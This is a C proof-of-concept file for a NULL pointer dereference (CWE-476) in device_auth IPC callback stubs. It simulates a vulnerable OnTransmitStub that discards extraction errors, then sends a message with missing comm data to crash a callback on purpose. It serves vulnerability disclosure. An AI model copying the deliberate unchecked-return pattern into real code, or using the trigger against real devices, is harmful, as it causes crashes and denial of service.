/**
 * PoC: OH-2026-DEVAUTH-001 — CWE-476 NULL Pointer Dereference
 *
 * Vulnerability: In device_auth IPC callback stubs (OnTransmitStub,
 * OnSessKeyStub, OnDevBoundStub, etc.), GetIpcRequestParamByType /
 * GetAndValNullParam return values are discarded with (void) cast.
 * When parameter extraction fails, pointers remain NULL and are
 * passed directly to application callbacks, causing SIGSEGV.
 *
 * Trigger: Send IPC callback message with missing PARAM_TYPE_COMM_DATA
 * → data stays NULL → onTransmitHook(requestId, NULL, 0) → crash.
 *
 * This PoC simulates the vulnerable OnTransmitStub path.
 */
#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>

/* ── Minimal type definitions matching device_auth ── */

#define HC_SUCCESS 0
#define HC_ERROR (-1)
#define MAX_REQUEST_PARAMS_NUM 8

#define PARAM_TYPE_REQID     1
#define PARAM_TYPE_COMM_DATA 2
#define PARAM_TYPE_SESS_KEY  3
#define PARAM_TYPE_UDID      4

typedef struct {
    int32_t type;
    uint8_t *val;
    int32_t valLen;
} IpcDataInfo;

typedef struct {
    IpcDataInfo *cbDataCache;
    int32_t cacheNum;
    uintptr_t cbHook;
    uintptr_t reply;
} CallbackParams;

/* ── Simulate GetIpcRequestParamByType — returns failure when param missing ── */

static int32_t GetIpcRequestParamByType(
    IpcDataInfo *dataCache, int32_t cacheNum,
    int32_t paramType, uint8_t *outParam, int32_t *outLen)
{
    for (int i = 0; i < cacheNum; i++) {
        if (dataCache[i].type == paramType) {
            if (outLen) {
                int32_t copyLen = dataCache[i].valLen < *outLen ? dataCache[i].valLen : *outLen;
                memcpy(outParam, dataCache[i].val, copyLen);
                *outLen = copyLen;
            }
            return HC_SUCCESS;
        }
    }
    /* Parameter not found — returns error, but caller discards it */
    return HC_ERROR;
}

/* ── Simulated application callback that dereferences data pointer ── */

static bool app_onTransmit_callback(int64_t requestId, uint8_t *data, uint32_t dataLen)
{
    /* Real application code would access data, e.g.: */
    printf("[CALLBACK] requestId=%ld, data=%p, dataLen=%u\n", (long)requestId, (void*)data, dataLen);

    if (data == NULL) {
        printf("[VULN] CONFIRMED: callback received NULL data pointer!\n");
        printf("[VULN] Any real callback that dereferences data will SIGSEGV here.\n");
        /* Demonstrate the crash by actually dereferencing */
        volatile uint8_t trigger = data[0];  /* CWE-476: NULL dereference */
        (void)trigger;
    }
    return true;
}

/* ── Signal handler to catch SIGSEGV and confirm vulnerability ── */

static jmp_buf jump_buf;
static volatile int caught_signal = 0;

static void sigsegv_handler(int sig) {
    caught_signal = sig;
    longjmp(jump_buf, 1);
}

/* ── Vulnerable OnTransmitStub — exact logic from ipc_adapt.c:484-499 ── */

static void OnTransmitStub_VULNERABLE(CallbackParams params)
{
    int64_t requestId = 0;
    int32_t inOutLen = sizeof(requestId);
    uint8_t *data = NULL;       /* ← initialized to NULL */
    uint32_t dataLen = 0u;
    bool bRet = false;
    bool (*onTransmitHook)(int64_t, uint8_t *, uint32_t) =
        (bool (*)(int64_t, uint8_t *, uint32_t))(params.cbHook);

    /* Return value discarded with (void) — THE BUG */
    (void)GetIpcRequestParamByType(params.cbDataCache, params.cacheNum,
        PARAM_TYPE_REQID, (uint8_t *)(&requestId), &inOutLen);
    (void)GetIpcRequestParamByType(params.cbDataCache, params.cacheNum,
        PARAM_TYPE_COMM_DATA, (uint8_t *)&data, (int32_t *)(&dataLen));

    /* data is still NULL because PARAM_TYPE_COMM_DATA was not in cache */
    bRet = onTransmitHook(requestId, data, dataLen);  /* ← passes NULL to callback */
    (void)bRet;
}

int main(void)
{
    printf("=== PoC: OH-2026-DEVAUTH-001 (CWE-476) ===\n");
    printf("Simulating malicious IPC message with missing PARAM_TYPE_COMM_DATA\n\n");

    /* Set up IPC data cache with ONLY requestId — no COMM_DATA */
    int64_t fakeReqId = 12345;
    IpcDataInfo cache[1] = {
        { .type = PARAM_TYPE_REQID, .val = (uint8_t *)&fakeReqId, .valLen = sizeof(fakeReqId) }
    };

    CallbackParams params = {
        .cbDataCache = cache,
        .cacheNum = 1,  /* Only 1 param — COMM_DATA is missing */
        .cbHook = (uintptr_t)app_onTransmit_callback,
        .reply = 0,
    };

    /* Install signal handler */
    signal(SIGSEGV, sigsegv_handler);

    if (setjmp(jump_buf) == 0) {
        /* Call the vulnerable stub */
        OnTransmitStub_VULNERABLE(params);
        printf("\n[ERROR] Should not reach here — vulnerability not triggered\n");
        return 1;
    } else {
        /* Caught SIGSEGV */
        printf("\n[VULN] SIGSEGV caught! NULL pointer dereference confirmed.\n");
        printf("[VULN] Root cause: (void)GetIpcRequestParamByType() discards error,\n");
        printf("       data pointer stays NULL, passed to callback which dereferences it.\n");
        printf("[VULN] Affected: OnTransmitStub, OnSessKeyStub, OnDevBoundStub,\n");
        printf("       OnDevUnboundStub, OnDevUnTrustStub, OnDelLastGroupStub (12 instances)\n");
        return 0;
    }
}
